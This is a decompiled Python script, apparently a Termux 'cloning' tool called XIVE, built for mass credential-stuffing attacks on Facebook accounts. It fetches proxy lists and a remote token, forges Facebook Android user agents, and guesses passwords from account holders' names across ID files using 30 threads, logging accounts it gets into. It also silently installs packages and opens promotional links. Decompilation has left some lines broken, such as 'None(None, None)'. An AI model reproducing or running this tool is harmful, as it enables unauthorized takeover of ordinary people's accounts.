# — — — — — — — — — — — — —
# Tool Made By @i6iii1
# Encoding: Pycdc 3.11
# Decode By @i6iii1
# Channel @mafiams1
# — — — — — — — — — — — — —
import os
import requests
import json
import time
import re
import random
import sys
import uuid
import string
import subprocess
import zlib
import platform
import marshal
import os
import httpx
import os
import base64
from os import system as clr
os.system('clear')
print(' INSTALLING MISSING MODULES!.....')
os.system('xdg-open https://chat.whatsapp.com/Ha7Ef6UDjCrLTxp6p5eAwb')
os.system('pip install httplib2')
import os
import requests
import json
import time
import re
import random
import sys
import uuid
import string
import subprocess
import platform
import string
from concurrent.futures import ThreadPoolExecutor as tred
proxylist = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
open('socksku.txt', 'w').write(proxylist)
proxsi = open('socksku.txt', 'r').read().splitlines()
os.system('rm -rf prox.txt')
prox = requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
open('prox.txt', 'w').write(prox)
prox = open('prox.txt', 'r').read().splitlines()
gt = random.choice([
    'GT-1015',
    'GT-1020',
    'GT-1030',
    'GT-1035',
    'GT-1040',
    'GT-1045',
    'GT-1050',
    'GT-1240',
    'GT-1440',
    'GT-1450',
    'GT-18190',
    'GT-18262',
    'GT-19060I',
    'GT-19082',
    'GT-19083',
    'GT-19105',
    'GT-19152',
    'GT-19192',
    'GT-19300',
    'GT-19505',
    'GT-2000',
    'GT-20000',
    'GT-200s',
    'GT-3000',
    'GT-414XOP',
    'GT-6918',
    'GT-7010',
    'GT-7020',
    'GT-7030',
    'GT-7040',
    'GT-7050',
    'GT-7100',
    'GT-7105',
    'GT-7110',
    'GT-7205',
    'GT-7210',
    'GT-7240R',
    'GT-7245',
    'GT-7303',
    'GT-7310',
    'GT-7320',
    'GT-7325',
    'GT-7326',
    'GT-7340',
    'GT-7405',
    'GT-7550    5GT-8005',
    'GT-8010',
    'GT-81',
    'GT-810',
    'GT-8105',
    'GT-8110',
    'GT-8220S',
    'GT-8410',
    'GT-9300',
    'GT-9320',
    'GT-93G',
    'GT-A7100',
    'GT-A9500',
    'GT-ANDROID',
    'GT-B2710',
    'GT-B5330',
    'GT-B5330B',
    'GT-B5330L',
    'GT-B5330ZKAINU',
    'GT-B5510',
    'GT-B5512',
    'GT-B5722',
    'GT-B7510',
    'GT-B7722',
    'GT-B7810',
    'GT-B9150',
    'GT-B9388',
    'GT-C3010',
    'GT-C3262',
    'GT-C3310R',
    'GT-C3312',
    'GT-C3312R',
    'GT-C3313T',
    'GT-C3322',
    'GT-C3322i',
    'GT-C3520',
    'GT-C3520I',
    'GT-C3592',
    'GT-C3595',
    'GT-C3782',
    'GT-C6712',
    'GT-E1282T',
    'GT-E1500',
    'GT-E2200',
    'GT-E2202',
    'GT-E2250',
    'GT-E2252',
    'GT-E2600',
    'GT-E2652W',
    'GT-E3210',
    'GT-E3309',
    'GT-E3309I',
    'GT-E3309T',
    'GT-G530H',
    'GT-g900f',
    'GT-G930F',
    'GT-H9500',
    'GT-I5508',
    'GT-I5801',
    'GT-I6410',
    'GT-I8150',
    'GT-I8160OKLTPA',
    'GT-I8160ZWLTTT',
    'GT-I8258',
    'GT-I8262D',
    'GT-I8268',
    'GT-I8505',
    'GT-I8530BAABTU',
    'GT-I8530BALCHO',
    'GT-I8530BALTTT',
    'GT-I8550E',
    'GT-i8700',
    'GT-I8750',
    'GT-I900',
    'GT-I9008L',
    'GT-i9040',
    'GT-I9080E',
    'GT-I9082C',
    'GT-I9082EWAINU',
    'GT-I9082i',
    'GT-I9100G',
    'GT-I9100LKLCHT',
    'GT-I9100M',
    'GT-I9100P',
    'GT-I9100T',
    'GT-I9105UANDBT',
    'GT-I9128E',
    'GT-I9128I',
    'GT-I9128V',
    'GT-I9158P',
    'GT-I9158V',
    'GT-I9168I',
    'GT-I9192I',
    'GT-I9195H',
    'GT-I9195L',
    'GT-I9250',
    'GT-I9303I',
    'GT-I9305N',
    'GT-I9308I',
    'GT-I9505G',
    'GT-I9505X',
    'GT-I9507V',
    'GT-I9600',
    'GT-m190',
    'GT-M5650',
    'GT-mini',
    'GT-N5000S',
    'GT-N5100',
    'GT-N5105',
    'GT-N5110',
    'GT-N5120',
    'GT-N7000B',
    'GT-N7005',
    'GT-N7100T',
    'GT-N7102',
    'GT-N7105',
    'GT-N7105T',
    'GT-N7108',
    'GT-N7108D',
    'GT-N8000',
    'GT-N8005',
    'GT-N8010',
    'GT-N8020',
    'GT-N9000',
    'GT-N9505',
    'GT-P1000CWAXSA',
    'GT-P1000M',
    'GT-P1000T',
    'GT-P1010',
    'GT-P3100B',
    'GT-P3105',
    'GT-P3108',
    'GT-P3110',
    'GT-P5100',
    'GT-P5200',
    'GT-P5210XD1',
    'GT-P5220',
    'GT-P6200',
    'GT-P6200L',
    'GT-P6201',
    'GT-P6210',
    'GT-P6211',
    'GT-P6800',
    'GT-P7100',
    'GT-P7300',
    'GT-P7300B',
    'GT-P7310',
    'GT-P7320',
    'GT-P7500D',
    'GT-P7500M',
    'GT-P7500R',
    'GT-P7500V',
    'GT-P7501',
    'GT-P7511',
    'GT-S3330',
    'GT-S3332',
    'GT-S3333',
    'GT-S3370',
    'GT-S3518',
    'GT-S3570',
    'GT-S3600i',
    'GT-S3650',
    'GT-S3653W',
    'GT-S3770K',
    'GT-S3770M',
    'GT-S3800W',
    'GT-S3802',
    'GT-S3850',
    'GT-S5220',
    'GT-S5220R',
    'GT-S5222',
    'GT-S5230',
    'GT-S5230W',
    'GT-S5233T',
    'GT-s5233w',
    'GT-S5250',
    'GT-S5253',
    'GT-s5260',
    'GT-S5280',
    'GT-S5282',
    'GT-S5283B',
    'GT-S5292',
    'GT-S5300',
    'GT-S5300L',
    'GT-S5301',
    'GT-S5301B',
    'GT-S5301L',
    'GT-S5302',
    'GT-S5302B',
    'GT-S5303',
    'GT-S5303B',
    'GT-S5310',
    'GT-S5310B',
    'GT-S5310C',
    'GT-S5310E',
    'GT-S5310G',
    'GT-S5310I',
    'GT-S5310L',
    'GT-S5310M',
    'GT-S5310N',
    'GT-S5312',
    'GT-S5312B',
    'GT-S5312C',
    'GT-S5312L',
    'GT-S5330',
    'GT-S5360',
    'GT-S5360B',
    'GT-S5360L',
    'GT-S5360T',
    'GT-S5363',
    'GT-S5367',
    'GT-S5369',
    'GT-S5380',
    'GT-S5380D',
    'GT-S5500',
    'GT-S5560',
    'GT-S5560i',
    'GT-S5570B',
    'GT-S5570I',
    'GT-S5570L',
    'GT-S5578',
    'GT-S5600',
    'GT-S5603',
    'GT-S5610',
    'GT-S5610K',
    'GT-S5611',
    'GT-S5620',
    'GT-S5670',
    'GT-S5670B',
    'GT-S5670HKBZTA',
    'GT-S5690',
    'GT-S5690R',
    'GT-S5830',
    'GT-S5830D',
    'GT-S5830G',
    'GT-S5830i',
    'GT-S5830L',
    'GT-S5830M',
    'GT-S5830T',
    'GT-S5830V',
    'GT-S5831i',
    'GT-S5838',
    'GT-S5839i',
    'GT-S6010',
    'GT-S6010BBABTU',
    'GT-S6012',
    'GT-S6012B',
    'GT-S6102',
    'GT-S6102B',
    'GT-S6293T',
    'GT-S6310B',
    'GT-S6310ZWAMID',
    'GT-S6312',
    'GT-S6313T',
    'GT-S6352',
    'GT-S6500',
    'GT-S6500D',
    'GT-S6500L',
    'GT-S6790',
    'GT-S6790L',
    'GT-S6790N',
    'GT-S6792L',
    'GT-S6800',
    'GT-S6800HKAXFA',
    'GT-S6802',
    'GT-S6810',
    'GT-S6810B',
    'GT-S6810E',
    'GT-S6810L',
    'GT-S6810M',
    'GT-S6810MBASER',
    'GT-S6810P',
    'GT-S6812',
    'GT-S6812B',
    'GT-S6812C',
    'GT-S6812i',
    'GT-S6818',
    'GT-S6818V',
    'GT-S7230E',
    'GT-S7233E',
    'GT-S7250D',
    'GT-S7262',
    'GT-S7270',
    'GT-S7270L',
    'GT-S7272',
    'GT-S7272C',
    'GT-S7273T',
    'GT-S7278',
    'GT-S7278U',
    'GT-S7390',
    'GT-S7390G',
    'GT-S7390L',
    'GT-S7392',
    'GT-S7392L',
    'GT-S7500',
    'GT-S7500ABABTU',
    'GT-S7500ABADBT',
    'GT-S7500ABTTLP',
    'GT-S7500CWADBT',
    'GT-S7500L',
    'GT-S7500T',
    'GT-S7560',
    'GT-S7560M',
    'GT-S7562',
    'GT-S7562C',
    'GT-S7562i',
    'GT-S7562L',
    'GT-S7566',
    'GT-S7568',
    'GT-S7568I',
    'GT-S7572',
    'GT-S7580E',
    'GT-S7583T',
    'GT-S758X',
    'GT-S7592',
    'GT-S7710',
    'GT-S7710L',
    'GT-S7898',
    'GT-S7898I',
    'GT-S8500',
    'GT-S8530',
    'GT-S8600',
    'GT-STB919',
    'GT-T140',
    'GT-T150',
    'GT-V8a',
    'GT-V8i',
    'GT-VC818',
    'GT-VM919S',
    'GT-W131',
    'GT-W153',
    'GT-X831',
    'GT-X853',
    'GT-X870',
    'GT-X890',
    'GT-Y8750'])
ugen = []
os.system('pip install httpx')
os.system('pip install requests rich')
os.system('pip install requests')
os.system('pip install mechanize')
os.system('pip install bs4 httpx')
os.system('clear')

def ax():
    facebook_version = f'''{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}'''
    fbbv = str(random.randint(410000000, 499999999))
    fbrv = str(random.randint(0, 999999999))
    fbcr = random.choice([
        'GigSky',
        'T-Mobile',
        'MegaFon',
        'telenor',
        'T-Mobile'])
    density = random.choice([
        '2x1.6'])
    width = random.choice([
        '720'])
    height = random.choice([
        '1612'])
    ua = f'''[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{str(fbrv)};FBCR/{str(fbcr)};FBMF/motorola;FBBD/motorola;FBPN/com.facebook.orca;FBDV/Moto E14;FBSV/14;FBOP/1;FBCA/armeabi-v7a:armeabi;]'''
    return ua


def bx():
    facebook_version = f'''{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}'''
    fbbv = str(random.randint(410000000, 499999999))
    fbrv = str(random.randint(0, 999999999))
    fbcr = random.choice([
        'GigSky',
        'T-Mobile',
        'MegaFon',
        'telenor',
        'T-Mobile'])
    density = random.choice([
        '2x1.6'])
    width = random.choice([
        '720'])
    height = random.choice([
        '1612'])
    ua = f'''[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{str(fbrv)};FBCR/{str(fbcr)};FBMF/motorola;FBBD/motorola;FBPN/com.facebook.orca;FBDV/Moto G04s ;FBSV/14;FBOP/1;FBCA/armeabi-v7a:armeabi;]'''
    return ua


def fire():
    facebook_version = '487.0.0.0.62'
    fbbv = '456407173'
    devices = random.choice([
        'Infinix X669',
        'Samsung Galaxy S21',
        'Google Pixel 5',
        'OnePlus 9',
        'Xiaomi Mi 11',
        'Oppo Reno 5',
        'Vivo V21',
        'Huawei P40',
        'Realme 8',
        'LG Velvet',
        'Motorola Moto G100',
        'Sony Xperia 10',
        'Nokia 8.3',
        'Asus Zenfone 8',
        'ZTE Axon 20',
        'TCL 10 Pro',
        'Lenovo Legion Phone Duel',
        'HTC U12+',
        'BlackBerry Key2',
        'Samsung Galaxy Note 20',
        'Google Pixel 6',
        'Xiaomi Redmi Note 10',
        'OnePlus Nord',
        'Oppo Find X3',
        'Vivo X60 Pro',
        'Motorola Edge 20',
        'Huawei Mate 40 Pro',
        'Sony Xperia 5 II',
        'Nokia G50',
        'Realme GT',
        'Nokia G50',
        'TCL 20 Pro 5G',
        'Honor 50',
        'Asus ROG Phone 5',
        'ZTE Axon 10 Pro'])
    fbsv = random.choice([
        '10',
        '11',
        '12',
        '13',
        '14',
        '15',
        '16',
        '17',
        '18',
        '19',
        '20',
        '21',
        '22',
        '23'])
    fbrv = str(random.randint(0, 999999999))
    density = random.choice([
        '2.0',
        '2.5',
        '3.0'])
    width = random.choice([
        '720',
        '1080',
        '1280'])
    height = random.choice([
        '720',
        '1080',
        '1280',
        '1440',
        '1920'])
    ua = f'''[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{str(fbrv)};FBCR/Airtel;FBMF/zte;FBBD/zte;FBDV/{devices};FBSV/{fbsv};FBCA/armeabi-v7a:armeabi-v7a;]'''
    return ua

gtt = random.choice([
    'GT-I9190',
    'KOT49H',
    'GT-I9192',
    'KOT49H',
    'GT-I9300I',
    'KTU84P',
    'GT-I9300',
    'IMM76D',
    'GT-I9300',
    'JSS15J',
    'GT-I9301I',
    'KOT4',
    'GT-I9301I',
    'KOT49H',
    'GT-I9500',
    'JDQ39',
    'GT-I9500',
    'LRX22C',
    'GT-N5100',
    'JZO54K',
    'GT-N7100',
    'KOT49H',
    'GT-N8000',
    'JZO54K',
    'GT-N8000',
    'KOT49H',
    'GT-P3110',
    'JZO54K',
    'GT-P5100',
    'IML74K',
    'GT-P5100',
    'JDQ',
    'GT-P5100',
    'JDQ39',
    'GT-P5100',
    'JZO54K',
    'GT-P5110',
    'JDQ39',
    'GT-P5200',
    'KOT49H',
    'GT-P5210',
    'KOT49H',
    'GT-P5220',
    'JDQ39',
    'GT-S7390',
    'JZO54K',
    'SAMSUNG',
    'SM-A500F',
    'SAMSUNG',
    'SM-G532F',
    'SAMSUNG',
    'SM-G920F',
    'SAMSUNG',
    'SM-G935F',
    'SAMSUNG',
    'SM-J320F',
    'SAMSUNG',
    'SM-J510FN',
    'SAMSUNG',
    'SM-N920S',
    'SAMSUNG',
    'SM-T280',
    'SM-A500FU',
    'MMB29M',
    'SM-A500F',
    'LRX22G',
    'SM-A500F',
    'MMB29M',
    'SM-A500H',
    'MMB29M',
    'SM-G900F',
    'KOT49H',
    'SM-G920F',
    'MMB29K',
    'SM-G920F',
    'NRD90M',
    'SM-G930F',
    'NRD90M',
    'SM-G935F',
    'MMB29K',
    'SM-G935F',
    'NRD90M',
    'SM-G950F',
    'NRD90M',
    'SM-J320FN',
    'LMY47V',
    'SM-J320F',
    'LMY4',
    'SM-J320F',
    'LMY47V',
    'SM-J320H',
    'LMY47V',
    'SM-J320M',
    'LMY47V',
    'SM-J510FN',
    'MMB29M',
    'SM-J510FN',
    'NMF2',
    'SM-J510FN',
    'NMF26X',
    'SM-J510FN',
    'NMF26X;',
    'SM-J701F',
    'NRD90M;',
    'SM-T111',
    'JDQ39',
    'SM-T230',
    'KOT49H',
    'SM-T231',
    'KOT49H',
    'SM-T235',
    'KOT4SM-T310',
    'KOT49H',
    'SM-T311',
    'KOT4',
    'SM-T311',
    'KOT49H',
    'SM-T315',
    'JDQ39',
    'SM-T525',
    'KOT49H',
    'SM-T531',
    'KOT49H',
    'SM-T531',
    'LRX22G',
    'SM-T535',
    'LRX22G',
    'SM-T555',
    'LRX22G',
    'SM-T561',
    'KTU84P',
    'SM-T705',
    'LRX22G',
    'SM-T705',
    'LRX22G',
    'SM-T805',
    'LRX22G',
    'SM*T820',
    'NRD90M',
    'SPH-L720',
    'KOT49H'])
kkkkki = random.choice([
    'SM-G920F',
    'NRD90M',
    'SM-T535',
    'LRX22G',
    'SM-T231',
    'KOT49H',
    'SM-J320F',
    'LMY47V',
    'GT-I9190',
    'KOT49H',
    'GT-N7100',
    'KOT49H',
    'SM-T561',
    'KTU84P',
    'GT-N7100',
    'KOT49H',
    'GT-I9500',
    'LRX22C',
    'SM-J320F',
    'LMY47V',
    'SM-G930F',
    'NRD90M',
    'SM-J320F',
    'LMY47V',
    'SM-J510FN',
    'NMF26X',
    'GT-P5100',
    'IML74K',
    'SM-J320F',
    'LMY47V',
    'GT-N8000',
    'JZO54K',
    'SM-T531',
    'LRX22G',
    'SPH-L720',
    'KOT49H',
    'GT-I9500',
    'JDQ39',
    'SM-G935F',
    'NRD90M',
    'SM-T561',
    'KTU84P',
    'SM-T531',
    'KOT49H',
    'SM-J320FN',
    'LMY47V',
    'SM-A500F',
    'MMB29M',
    'SM-A500FU',
    'MMB29M',
    'SM-A500F',
    'MMB29M',
    'SM-T311',
    'KOT49H',
    'SM-T531',
    'LRX22G',
    'SM-J320F',
    'LMY47V',
    'SM-J320FN',
    'LMY47V',
    'SM-J320F',
    'LMY47V',
    'GT-P5210',
    'KOT49H',
    'SM-T230',
    'KOT49H',
    'GT-I9192',
    'KOT49H',
    'SM-T235',
    'KOT4',
    'GT-N7100',
    'KOT49H',
    'SM-A500F',
    'LRX22G',
    'SM-A500F',
    'MMB29M',
    'GT-N7100',
    'KOT49H',
    'SM-G920F',
    'MMB29K',
    'SM-J510FN',
    'NMF26X',
    'GT-N8000',
    'JZO54K',
    'SM-J320FN',
    'LMY47V',
    'SM-J320FN',
    'LMY47V',
    'SM-A500H',
    'MMB29M',
    'GT-I9300',
    'JSS15J',
    'GT-I9500',
    'LRX22C',
    'SM-J320F',
    'LMY4',
    'SM-J510FN',
    'NMF26X',
    'SM-A500F',
    'MMB29M',
    'GT-N8000',
    'KOT49H',
    'SM-T561',
    'KTU84P',
    'SM-G900F',
    'KOT49H',
    'GT-S7390',
    'JZO54K',
    'SM-J320F',
    'LMY47V',
    'GT-P5100',
    'JZO54K',
    'SM-A500FU',
    'MMB29M',
    'SM-G930F',
    'NRD90M',
    'SM-J510FN',
    'NMF26X',
    'SM-T561',
    'KTU84P',
    'GT-N8000',
    'KOT49H',
    'SM-T531',
    'LRX22G',
    'SM-J510FN',
    'MMB29M',
    'SM-J510FN',
    'NMF26X',
    'SM-J320F',
    'LMY47V',
    'GT-P5110',
    'JDQ39',
    'GT-I9301I',
    'KOT49H',
    'SM-A500F',
    'LRX22G',
    'SM-G930F',
    'NRD90M',
    'SM-T311',
    'KOT4',
    'GT-P5200',
    'KOT49H',
    'GT-I9301I',
    'KOT49H',
    'SM-J320M',
    'LMY47V',
    'SM-T531',
    'LRX22G',
    'SM-T820',
    'NRD90M',
    'GT-I9192',
    'KOT49H',
    'SM-G935F',
    'MMB29K',
    'SM-J701F',
    'NRD90M;',
    'GT-I9301I',
    'KOT4',
    'SM-J320FN',
    'LMY47V',
    'SM-T111',
    'JDQ39',
    'SM-A500F',
    'MMB29M',
    'SM-J510FN',
    'NMF2',
    'SM-T705',
    'LRX22G',
    'SM-G920F',
    'NRD90M',
    'GT-N5100',
    'JZO54K',
    'GT-I9300I',
    'KTU84P',
    'GT-I9300I',
    'KTU84P',
    'GT-N8000',
    'KOT49H',
    'GT-N8000',
    'KOT49H',
    'SM-A500F',
    'MMB29M',
    'GT-I9190',
    'KOT49H',
    'SM-J510FN',
    'NMF26X',
    'SM-J320F',
    'LMY47V',
    'GT-P5100',
    'JDQ39',
    'GT-I9300I',
    'KTU84P',
    'GT-N5100',
    'JZO54K',
    'GT-N8000',
    'KOT49H',
    'GT-I9500',
    'LRX22C',
    'SM-J320FN',
    'LMY47V',
    'SM-A500F',
    'MMB29M',
    'GT-N8000',
    'JZO54K',
    'SM-T805',
    'LRX22G',
    'SM-T231',
    'KOT49H',
    'GT-N5100',
    'JZO54K',
    'SM-J320H',
    'LMY47V',
    'SM-T231',
    'KOT49H',
    'SM-G930F',
    'NRD90M',
    'SM-G935F',
    'NRD90M',
    'SM-T310',
    'KOT49H',
    'GT-N8000',
    'KOT49H',
    'GT-I9300I',
    'KTU84P',
    'SM-G920F',
    'NRD90M',
    'SM-J510FN',
    'NMF26X',
    'SM-T705',
    'LRX22G;',
    'GT-P3110',
    'JZO54K',
    'GT-I9192',
    'KOT49H',
    'SM-J320F',
    'LMY47V',
    'SM-G920F',
    'NRD90M',
    'GT-I9300',
    'IMM76D',
    'SM-G950F',
    'NRD90M',
    'SM-J320F',
    'LMY47V',
    'SM-J510FN',
    'NMF26X;',
    'SM-J701F',
    'NRD90M',
    'SM-A500F',
    'LRX22G',
    'SM-T231',
    'KOT49H',
    'SM-T311',
    'KOT49H',
    'SM-J320FN',
    'LMY47V',
    'GT-P5210',
    'KOT49H',
    'SM-T805',
    'LRX22G',
    'GT-I9500',
    'LRX22C',
    'GT-P5200',
    'KOT49H',
    'GT-I9301I',
    'KOT49H',
    'GT-I9300',
    'JSS15J',
    'GT-N7100',
    'KOT49H',
    'SM-T531',
    'LRX22G',
    'SM-T820',
    'NRD90M',
    'SM-T315',
    'JDQ39',
    'SM-J320F',
    'LMY47V',
    'GT-I9190',
    'KOT49H',
    'GT-P5220',
    'JDQ39',
    'SM-T525',
    'KOT49H',
    'SM-T555',
    'LRX22G',
    'GT-I9190',
    'KOT49H',
    'SM-J510FN',
    'NMF26X;',
    'SM-A500F',
    'MMB29M',
    'GT-I9192',
    'KOT49H',
    'GT-P5100',
    'JDQ',
    'SM-T311',
    'KOT49H'])
os.system('xdg-open https://www.facebook.com/profile.php?id=61567260155338&mibextid=ZbWKwL')
P = '\x1b[1;97m'
M = '\x1b[1;33m'
H = '\x1b[1;32m'
K = '\x1b[1;97m'
B = '\x1b[1;96m'
U = '\x1b[1;95m'
O = '\x1b[1;97m'
R = '\x1b[38;5;246m'
N = '\x1b[0m'
my_color = [
    P,
    M,
    H,
    K,
    B,
    U,
    O,
    N,
    R]
ssn = requests.Session()
orange = '\x1b[38;5;196m'
yellow = '\x1b[38;5;208m'
black = '\x1b[1;30m'
red = '\x1b[38;5;160m'
green = '\x1b[38;5;46m'
yelloww = '\x1b[1;33m'
blue = '\x1b[38;5;6m'
purple = '\x1b[1;35m'
cyan = '\x1b[1;36m'
white = '\x1b[1;37m'
faltu = '\x1b[1;47m'
pvt = '\x1b[1;0m'
gren = '\x1b[38;5;154m'
gas = '\x1b[1;32m'
blw = '\x1b[1;34m'
abir = random.choice([
    '\x1b[38;5;196m',
    '\x1b[38;5;208m',
    '\x1b[1;30m',
    '\x1b[38;5;160m',
    '\x1b[38;5;46m',
    '\x1b[1;33m',
    '\x1b[38;5;6m',
    '\x1b[1;35m',
    '\x1b[1;36m',
    '\x1b[1;37m'])
my_color = [
    white,
    blue,
    green]
warna = random.choice(my_color)
version = requests.get('https://raw.githubusercontent.com/xive7/Server/refs/heads/main/Version.txt').text
version = version.strip()
session = requests.Session()
token = requests.get('https://raw.githubusercontent.com/xive7/Server/refs/heads/main/Token.txt').text
token = token.strip()
session = requests.Session()
folder_path = '/sdcard/XIVE'
os.makedirs(folder_path, exist_ok = True)

def p(x):
    print(x)

logo = f'''\n{green}\n    ██   ██ ██ ██    ██ ███████ \n     ██ ██  ██ ██    ██ ██      \n      ███   ██ ██    ██ █████   \n     ██ ██  ██  ██  ██  ██      \n    ██   ██ ██   ████   ███████  {black}S3 {red}V/{version}    \n\x1b[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ '''

def linex():
    print('\x1b[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')


def clear():
    os.system('clear')
    print(logo)

loop = 0
lim = 0
tp = 0
oks = []
cps = []
pcp = []
id = []
plist = []
methods = []
speed = []
twf = []
output = subprocess.check_output('getprop gsm.operator.alpha', shell = True).decode('utf-8')
carrier = output.replace(',', '\x1b[1;32m|\x1b[1;32m').replace('\n', '')

def menu():
    pp()
    gx()
    clear()
    print(f'''{green}[1] CRACK FILE ''')
    print(f'''{green}[2] RANDOM OLD CLONING''')
    print(f'''{green}[3] AUTO CREATE''')
    print(f'''{green}[4] FILE CREATE''')
    print(f'''{green}[5] AUTO DUMP FILE''')
    print(f'''{green}[0] EXIT ''')
    linex()
    xd = input(f'''{white}CHOOSE : {green}''')
    if xd in ('1', '01'):
        clear()
        print(f'''{green}[+] FILE EXAMPLE : /sdcard/xive.txt''')
        linex()
        file = input(f'''{green}[{white}➤{green}] ENTER FILE PATH\x1b[1;32m :{white} ''')
        fo = open(file, 'r').read().splitlines()
        clear()
        print(f'''{green}[1] METHOD''')
        print(f'''{green}[2] METHOD''')
        print(f'''{green}[3] METHOD''')
        print(f'''{green}[4] METHOD''')
        linex()
        mthd = input(f'''{white}CHOOSE : ''')
        linex()
        plist = []
        clear()
        print(f'''{green}[1] AUTO PASSWORD ''')
        print(f'''{green}[2] MANUAL PASSWORD ''')
        linex()
        psx = input(f'''{white}CHOOSE :{green} ''')
        if psx in ('1', '01'):
            plist.append('first first')
            plist.append('first last')
            plist.append('last first')
            plist.append('last last')
            plist.append('firstfirst')
            plist.append('firstlast')
            plist.append('lastfirst')
            plist.append('lastlast')
            plist.append('firstlast123')
            plist.append('firstlast1234')
            plist.append('firstlast12345')
            plist.append('first 123')
            plist.append('first 1234')
            plist.append('first 12345')
            plist.append('first12')
            plist.append('first123')
            plist.append('first1234')
            plist.append('first12345')
            plist.append('first123456')
            plist.append('first123456789')
            plist.append('first123123')
            plist.append('first@123')
            plist.append('first@1234')
            plist.append('first@12345')
            plist.append('first@last')
            plist.append('first@@')
            plist.append('first112233')
        linex()
        ps_limit = int(input(f'''{green}[+] HOW MANY PASSWORDS DO YOU WANT TO ADD ? '''))
        linex()
        print(f'''{green}[+] EXAMPLE : first last,firtslast,first123''')
        linex()
        for i in range(ps_limit):
            plist.append(input(f'''{green}[+] PASSWORD {i + 1}:{red}'''))
            clear()
            print(f'''{green}[+] DO YOU WENT SHOW CP ACCOUNT ? [Y/N] : ''')
            linex()
            cx = input(f'''{white}CHOOSE :{green} ''')
            if cx in ('y', 'Y', 'yes', 'Yes', '1'):
                pcp.append('y')
        pcp.append('n')
        crack_submit = tred(max_workers = 30)
        clear()
        total_ids = str(None(len))
        print(f'''{black}[{green}<|>{black}] {blw}IF NO RESULT \x1b[1;37m[\x1b[1;31mON\x1b[1;31m/\x1b[1;31mOFF\x1b[1;37m] \x1b[1;32mAIRPLAN MODE ''')
        linex()
        for user in fo:
            (ids, names) = user.split('|')
            passlist = plist
            if mthd in ('1', '01'):
                crack_submit.submit(filemethod1, ids, names, passlist, total_ids)
            if mthd in ('2', '02'):
                crack_submit.submit(filemethod2, ids, names, passlist, total_ids)
            if mthd in ('3', '03'):
                crack_submit.submit(filemethod3, ids, names, passlist, total_ids)
            if mthd in ('4', '04'):
                crack_submit.submit(filemethod4, ids, names, passlist, total_ids)
            if mthd in ('5', '05'):
                crack_submit.submit(M_file_5, ids, names, passlist, total_ids)
            if not mthd in ('6', '06'):
                pass
            crack_submit.submit(M_file_6, ids, names, passlist, total_ids)
            None(None, None)
            print('\x1b[1;37m')
            linex()
            print(f'''{green}The process has completed''')
            print(f'''{green}OK/CP: ''' + str(len(oks)) + '/' + str(len(cps)))
            linex()
            input(f'''{green}[➤] PRESS ENTER TO BACK ''')
            os.system('python xive.py')
            return None
            if xd in ('2', '02'):
                rn()
                return None
    if xd in ('3', '03'):
        manu()
        return None
    if xd in ('4', '04'):
        os.system('python File.py')
        print('python File.py')
        return None
    if xd in ('5', '05'):
        os.system('python dump.py')
        return None
    if xd in ('0', '00'):
        exit(' Thanks for use ♥ ')
        return None
    exit(' Option not found in menu...')
    return None
    if FileNotFoundError:
        print(f'''{green}[+] FILE LOCATION NOT FOUND ''')
        time.sleep(1)
        menu()
    ps_limit = 1
    if not None:
        pass


def filemethod1(ids, names, passlist, total_ids):
    global loop
    fn = names.split(' ')[0]
    ln = names.split(' ')[1]
    for pw in passlist:
        sys.stdout.write(f'''\r\r{green}[XIVE-M1] {white}%s|{blue}{total_ids}|{green}%s ''' % (loop, len(oks)))
        sys.stdout.flush()
        pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
        user_agentox = 'Dalvik/2.1.0 Linux; U; Android ' + str(random.randrange(5, 14)) + '; ' + str(random.choice([
            'M2101K7AG',
            'M2003J15SC',
            'M2004J19C',
            'M2006C3LG',
            'M2007J20CG',
            'M2010J19CG',
            'M2011K2C',
            'M2012K11AG',
            'M2101K7BG',
            'M2101K9G',
            'M2102J20SG',
            'M2102K1G',
            'M2003J15SC',
            'MI MAX 2',
            'AT&amp-T',
            'Redmi Note 4',
            'Redmi 4X',
            'Redmi Note 8 Pro',
            'Redmi Note 5',
            'Redmi Note 8T',
            'Redmi 6A',
            'Redmi 7A',
            'MI PLAY',
            'MI 8 Lite',
            'Mi 9T',
            'Mi A2 Lite',
            ' Mi 9',
            'M2101K7AG'])) + ' Build/QP1A.' + str(random.randrange(111111, 999999)) + ') [FBAN/FB4A;FBAV/' + str(random.randint(199, 399)) + '.0.0.' + str(random.randint(1, 9)) + '.' + str(random.randint(99, 199)) + ';FBBV/' + str(random.randint(111111111, 999999999)) + ';FBDM/{density=' + str(random.randint(2, 3)) + '.' + str(random.randint(2, 5)) + ',width=1080,height=' + str(random.randint(1400, 1499)) + '};FBLC/' + str(random.choice([
            'cs_CZ',
            'en_GB',
            'en_US',
            'lt_LT',
            'pl_PL',
            'id_ID',
            'ru_RU',
            'pt_PT',
            'he_IL',
            'hi_IN',
            'nl_NL',
            ' it_IT',
            'en_IN',
            'es_ES',
            'en_PK'])) + ';FBCR/' + str(random.choice([
            'Tele2You',
            'Telenor',
            'FASTWEB',
            'Banglalink',
            'Sprint',
            'Jazz',
            'Vodafone IN',
            'Vi India',
            'Tele2 LT',
            'Jio 4G',
            'EE',
            'Oi',
            'MtelBG',
            'AT&amp-T',
            'Ufone',
            'Azercell'])) + ';FBMF/Xiaomi;FBBD/' + str(random.choice([
            'Xiaomi',
